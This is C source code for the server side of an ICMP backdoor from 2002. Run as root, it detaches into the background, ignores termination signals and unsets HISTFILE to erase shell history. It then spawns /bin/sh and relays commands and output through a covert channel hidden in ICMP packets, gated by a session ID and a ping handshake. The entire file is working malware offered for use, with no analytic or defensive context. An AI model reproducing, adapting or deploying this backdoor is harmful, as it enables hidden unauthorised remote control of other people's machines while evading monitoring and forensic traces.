/* Copyright (C) 2002 Martin J. Muench <mjm@codito.de> */

#include "config.h"

extern void sendpacket(char *, char *, int);

int main (int argc, char **argv) {

 int    numActiveFDs, shell, maxFD, null=0, auth=0, cliseq=CLISEQ, srvseq=SRVSEQ;
 char   host[256], *payload, pbuf[CHARS] ,sbuf[CHARS];
 pid_t  pid;
 u_char buf[1024];
 fd_set readset;

 if (argc < 2)
	printf("\nicmp-backdoor (server)\n\nusage: ibd-server <icmpcode>\n\n"), exit(1);
 if (getuid() != 0)
	printf("you need to be root!\n\n"), exit(-1);

 icmpcode = atoi(argv[1]);

 rawsock = get_raw_sock();
  
 fprintf(stderr, "\nicmp-backdoor %s, starting server...", VERSION);

 if((pid = fork()) < 0)
   perror("cannot fork: ");
 else if (pid)
   fprintf(stderr, "done.\n"), exit(0);

 chdir("/");
 setenv("PATH", "/sbin:/bin:/usr/sbin:/usr/bin:/usr/local/bin/:/usr/local/sbin/:.", 1);
 unsetenv("HISTFILE");
 
 signal(SIGCHLD, SIG_IGN);
 signal(SIGHUP, SIG_IGN);
 signal(SIGTERM, SIG_IGN);
 
 if((shell=popen2("/bin/sh")) < 0)
 	perror("cannot open shell: "), exit(-1);

 for(;;) {
 
    FD_ZERO(&readset); 
    FD_SET(rawsock, &readset); 
    FD_SET(shell, &readset);
    maxFD = rawsock + shell;
    numActiveFDs = Select((maxFD + 1), &readset);

    if (FD_ISSET(rawsock, &readset)) {
	memset(&buf, 0, sizeof(buf));
        if (recvfrom(rawsock,buf,1024,0,(struct sockaddr *)&saddr,&null) < 0) 
		break;

	  ip=(struct ip *)buf;
	  icmp=(struct icmp *)&buf[ip->ip_hl<<2];
		
	  if (icmp->icmp_seq == cliseq) {

	    payload = (buf + sizeof(struct ip) + sizeof(struct icmp));

	    if(!strncmp(payload,SID,strlen(SID))) {
			
		payload=(payload + strlen(SID));
		
		if(!strcmp(payload,PING))
			sendpacket(PONG, inet_ntoa(ip->ip_src), srvseq),auth++;
		else if (auth)
			write(shell, payload, strlen(payload));
	  }
        }
    }
    if (FD_ISSET(shell, &readset)) {
	    memset(&pbuf,0,CHARS);
	    memset(&sbuf,0,CHARS);
	    
	    if (read(shell, pbuf, CHARS-1) < 0)
	    	break;
	
	    strncat(sbuf, pbuf, CHARS);
	    if(strlen(sbuf) < CHARS-1)
		    strncat(sbuf, "\n# ", 3);
	
	    sendpacket(sbuf, inet_ntoa(ip->ip_src), srvseq);
    }
}
exit(0);
}
